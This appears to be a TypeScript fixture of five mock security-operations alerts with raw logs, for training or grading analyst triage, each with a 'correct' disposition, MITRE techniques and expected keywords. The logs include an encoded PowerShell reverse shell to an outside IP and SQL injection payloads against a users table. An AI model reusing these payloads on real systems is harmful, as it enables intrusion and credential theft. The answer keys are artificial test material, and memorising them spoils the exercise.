import type { SocAlert } from '../types';

export const MOCK_ALERTS: SocAlert[] = [
  {
    id: 'alert-001',
    title: 'Suspicious Encoded PowerShell Execution',
    severity: 'high',
    source: 'edr',
    timestamp: '2026-06-13T03:41:12Z',
    description: 'EDR telemetry detected powershell.exe launched with -Enc flag (Base64-encoded command) from cmd.exe. No prior parent-chain justification.',
    context: 'jdoe is a standard employee in the Marketing department. No scheduled tasks or IT work orders match this host or time window. PowerShell execution is not expected on Marketing endpoints.',
    rawLogs: `EventID 4688 — Process Creation
  TimeCreated:      2026-06-13T03:41:12Z
  Computer:         WORKSTATION-14.corp.company.com
  SubjectUserName:  jdoe
  SubjectDomainName:CORP
  NewProcessName:   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
  CommandLine:      powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA3ACIALAA0ADQANAA0ACkA
  ParentProcessName:C:\\Windows\\System32\\cmd.exe
  ParentCommandLine:cmd.exe /c "start powershell.exe -NoP -NonI..."

Decoded Base64 (partial):
  $client = New-Object System.Net.Sockets.TCPClient("185.220.101.47", 4444)
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};

EDR Network Event (same host, 3s later):
  OutboundConn → 185.220.101.47:4444 (TCP)`,
    correctDisposition: 'true-positive',
    correctMitreTechniques: ['T1059', 'T1059.001', 'T1027', 'T1105'],
    escalationKeywords: ['powershell', 'encoded', 'obfuscated', 'suspicious', 'isolate'],
  },

  {
    id: 'alert-002',
    title: 'Large Outbound Transfer to Rare External IP',
    severity: 'high',
    source: 'firewall',
    timestamp: '2026-06-13T04:12:55Z',
    description: 'Firewall logged 500 MB of outbound TCP/443 traffic from FILESERVER-02 to 185.220.101.47. Duration 8+ minutes. Destination geolocates to Russia (Tor exit node list hit).',
    context: 'FILESERVER-02 hosts the HR and Finance shared drives. No cloud backup jobs or approved transfers are scheduled for this time window. 185.220.101.47 is on multiple threat intel feeds as a Tor exit node. Typical outbound from this server is < 5 MB/session.',
    rawLogs: `Palo Alto Firewall — Traffic Log
  TimeCreated:    2026-06-13T04:12:55Z
  Action:         ALLOW (matched rule: allow-out-443)
  SrcIP:          10.20.1.88   (FILESERVER-02.corp.company.com)
  SrcPort:        51234
  DstIP:          185.220.101.47
  DstPort:        443
  Protocol:       TCP
  Application:    ssl
  Category:       unknown
  BytesSent:      524,288,000  (≈ 500 MB)
  BytesReceived:  1,024
  Duration:       00:08:33
  SessionEndReason: tcp-fin

Threat Intel Enrichment:
  185.220.101.47  → Listed on:
    - AbuseIPDB (reports: 1,847)
    - Spamhaus DROP list
    - Tor exit node list (torproject.org)
  GeoIP: RU / AS204428 (SS-Net LLC)`,
    correctDisposition: 'true-positive',
    correctMitreTechniques: ['T1048', 'T1048.002'],
    escalationKeywords: ['exfiltration', 'outbound', 'data', 'transfer', 'unusual', 'tor'],
  },

  {
    id: 'alert-003',
    title: 'Multiple Admin Auth Failures — Helpdesk Machine',
    severity: 'low',
    source: 'siem',
    timestamp: '2026-06-13T09:02:11Z',
    description: 'SIEM correlation rule triggered: 3 failed logins to SRVADM01\\Administrator within 33 seconds from HELPDESK-PC-03. Threshold: 3+ failures in 60 seconds.',
    context: 'HELPDESK-PC-03 is assigned to L1 analyst Tom B. (IT team). SRVADM01 is the shared admin jump server. Tom opened Ticket IT-28831 ("Locked out of SRVADM01 admin account") at 09:05. The IT manager approved a password reset at 09:07. No other IOCs present on this machine.',
    rawLogs: `SIEM Correlation Alert — Rule: BRUTE_FORCE_ADMIN_01
  Window:   2026-06-13T09:02:11Z – 09:02:44Z  (33 seconds)
  Threshold: 3 failures / 60s (triggered)

  Event 1 — 4625 Logon Failure
    TimeCreated:    09:02:11Z
    TargetUserName: Administrator
    TargetHost:     SRVADM01
    WorkstationName:HELPDESK-PC-03
    IpAddress:      10.10.2.15
    FailureReason:  Unknown user name or bad password

  Event 2 — 4625 Logon Failure
    TimeCreated:    09:02:31Z
    TargetUserName: Administrator
    WorkstationName:HELPDESK-PC-03
    FailureReason:  Unknown user name or bad password

  Event 3 — 4625 Logon Failure
    TimeCreated:    09:02:44Z
    TargetUserName: Administrator
    WorkstationName:HELPDESK-PC-03
    FailureReason:  Unknown user name or bad password

Ticket IT-28831 (opened 09:05 by Tom B.):
  "Hi IT, I'm locked out of the SRVADM01 admin account.
   Just returned from PTO and can't remember the password."`,
    correctDisposition: 'false-positive',
    correctMitreTechniques: [],
    escalationKeywords: ['false positive', 'helpdesk', 'ticket', 'no action', 'expected'],
  },

  {
    id: 'alert-004',
    title: 'SQL Injection Attempt — Production Web App',
    severity: 'high',
    source: 'ids',
    timestamp: '2026-06-13T11:33:07Z',
    description: 'Snort IDS detected SQL injection signature in inbound HTTP request to WEBSERVER-PROD. User-Agent identifies sqlmap — an automated SQL injection scanner. Firewall rule permits 0.0.0.0/0 → port 80.',
    context: 'shop.company.com is the public e-commerce site running on WEBSERVER-PROD (10.0.0.50). The site uses a MySQL backend. The IDS alerted but did NOT block the request — firewall rule allows HTTP from any source. The WAF was disabled last week for maintenance and not re-enabled.',
    rawLogs: `Snort IDS Alert — Priority: HIGH
  Rule:     SERVER-WEBAPP SQL injection attempt (sid:1-23456, rev:3)
  TimeCreated:  2026-06-13T11:33:07Z

  SrcIP:     203.0.113.99
  SrcPort:   54321
  DstIP:     10.0.0.50  (WEBSERVER-PROD)
  DstPort:   80  (HTTP)
  Protocol:  TCP
  Action:    ALERT (not blocked)

  HTTP Request (reconstructed):
    GET /search?q=1%27+UNION+SELECT+null%2Cusername%2Cpassword+FROM+users-- HTTP/1.1
    Host: shop.company.com
    User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)
    Accept: */*

  Decoded query param:
    q = 1' UNION SELECT null,username,password FROM users--

  Follow-on requests (same src, same session — last 60s):
    /search?q=1'+AND+SLEEP(5)--
    /search?q=1'+AND+1=CONVERT(int,(SELECT+TOP+1+name+FROM+sysobjects))--
    /admin/login?user=admin'--&pass=x
    /wp-login.php (404)
    /.env (404)`,
    correctDisposition: 'true-positive',
    correctMitreTechniques: ['T1190'],
    escalationKeywords: ['sql injection', 'web application', 'sqlmap', 'block', 'patch', 'waf'],
  },

  {
    id: 'alert-005',
    title: 'Cobalt Strike Beacon — Finance Laptop',
    severity: 'critical',
    source: 'av',
    timestamp: '2026-06-13T14:05:33Z',
    description: 'AV/EDR detected svchost32.dll (SHA256 hash matches known Cobalt Strike reflective loader) on LAPTOP-FINANCE-07. Network telemetry shows the process calling home to 91.234.55.119:443 every 30 seconds.',
    context: 'mwilson is a Finance manager with access to payroll, AP systems, and the CFO\'s shared drive. LAPTOP-FINANCE-07 was exempted from auto-kill rules to avoid disrupting month-end close. The hash 7e3f8a...ef01 matches multiple Cobalt Strike samples in VirusTotal (68/72 detections). 91.234.55.119 is a known C2 server operated by FIN7.',
    rawLogs: `AV/EDR Alert — Malware Detection (CRITICAL)
  TimeCreated:    2026-06-13T14:05:33Z
  Computer:       LAPTOP-FINANCE-07.corp.company.com
  User:           mwilson  (Finance — VP level)
  Domain:         CORP

  FilePath:       C:\\Users\\mwilson\\AppData\\Roaming\\svchost32.dll
  FileSize:       412,672 bytes
  FileHash (SHA256):
    7e3f8a1bc2d9e4f6a0b5c8d2e1f3a4b6c7d8e9f0a1b2c3d4e5f6789abcdef01
  Detection:      CobaltStrike.Beacon.ReflectiveDLL (Confidence: 99%)
  VT Score:       68/72

  Network Activity (EDR telemetry, last 10 min):
    svchost32.dll → 91.234.55.119:443  (beacon check-in, ~30s interval)
    DNS query: cdn-static.company-update.net → 91.234.55.119

  Threat Intel:
    91.234.55.119  → FIN7 C2 infrastructure (multiple sources)
    Hash           → 14 Cobalt Strike samples, current campaign active

  Auto-kill:      DISABLED (Finance exception policy)
  Process still RUNNING at time of alert.`,
    correctDisposition: 'true-positive',
    correctMitreTechniques: ['T1071', 'T1071.001', 'T1055', 'T1105'],
    escalationKeywords: ['cobalt strike', 'beacon', 'isolate', 'incident', 'c2', 'malware', 'fin7'],
  },
];

export function getAlertById(id: string): SocAlert | undefined {
  return MOCK_ALERTS.find((a) => a.id === id);
}
